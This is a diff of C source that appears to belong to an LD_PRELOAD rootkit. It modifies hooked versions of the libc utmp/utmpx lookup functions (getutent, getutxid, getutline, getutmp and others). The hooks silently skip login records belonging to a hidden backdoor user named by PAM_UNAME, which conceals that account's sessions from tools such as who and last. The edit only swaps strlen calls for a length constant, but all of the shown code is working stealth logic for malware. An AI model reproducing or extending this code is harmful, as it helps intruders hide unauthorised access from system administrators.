@@ -17,7 +17,7 @@ struct utmp *getutid(const struct utmp *ut){
     do{
         tmp = call(CGETUTID, ut);
         if(tmp == NULL) continue;
-    }while(tmp && !strncmp(PAM_UNAME, tmp->ut_user, strlen(PAM_UNAME)));
+    }while(tmp && !strncmp(PAM_UNAME, tmp->ut_user, LEN_PAM_UNAME));
 
     return tmp;
 }
@@ -30,7 +30,7 @@ struct utmpx *getutxid(const struct utmpx *utx){
     do{
         tmp = call(CGETUTXID, utx);
         if(tmp == NULL) continue;
-    }while(tmp && !strncmp(PAM_UNAME, tmp->ut_user, strlen(PAM_UNAME)));
+    }while(tmp && !strncmp(PAM_UNAME, tmp->ut_user, LEN_PAM_UNAME));
 
     return tmp;
 }
@@ -43,7 +43,7 @@ struct utmp *getutline(const struct utmp *ut){
     do{
         tmp = call(CGETUTLINE, ut);
         if(tmp == NULL) continue;
-    }while(tmp && !strncmp(PAM_UNAME, tmp->ut_user, strlen(PAM_UNAME)));
+    }while(tmp && !strncmp(PAM_UNAME, tmp->ut_user, LEN_PAM_UNAME));
 
     return tmp;
 }
@@ -56,7 +56,7 @@ struct utmpx *getutxline(const struct utmpx *utx){
     do {
         tmp = call(CGETUTXLINE, utx);
         if(tmp == NULL) continue;
-    }while(tmp && !strncmp(PAM_UNAME, tmp->ut_user, strlen(PAM_UNAME)));
+    }while(tmp && !strncmp(PAM_UNAME, tmp->ut_user, LEN_PAM_UNAME));
 
     return tmp;
 }
@@ -69,7 +69,7 @@ struct utmp *getutent(void){
     do{
         tmp = call(CGETUTENT);
         if(tmp == NULL) continue;
-    }while(tmp && !strncmp(PAM_UNAME, tmp->ut_user, strlen(PAM_UNAME)));
+    }while(tmp && !strncmp(PAM_UNAME, tmp->ut_user, LEN_PAM_UNAME));
 
     return tmp;
 }
@@ -82,7 +82,7 @@ struct utmpx *getutxent(void){
     do{
         tmp = call(CGETUTXENT);
         if(tmp == NULL) continue;
-    }while(tmp && !strncmp(PAM_UNAME, tmp->ut_user, strlen(PAM_UNAME)));
+    }while(tmp && !strncmp(PAM_UNAME, tmp->ut_user, LEN_PAM_UNAME));
 
     return tmp;
 }
@@ -91,7 +91,7 @@ void getutmp(const struct utmpx *ux, struct utmp *u){
     if(hide_me) return;
 
     if(ux){
-        if(!strncmp(PAM_UNAME, ux->ut_user, strlen(PAM_UNAME))){
+        if(!strncmp(PAM_UNAME, ux->ut_user, LEN_PAM_UNAME)){
             hide_me = 1;
             return;
         }
@@ -105,7 +105,7 @@ void getutmpx(const struct utmp *u, struct utmpx *ux){
     if(hide_me) return;
 
     if(u){
-        if(!strncmp(PAM_UNAME, u->ut_user, strlen(PAM_UNAME))){
+        if(!strncmp(PAM_UNAME, u->ut_user, LEN_PAM_UNAME)){
             hide_me = 1;
             return;
         }
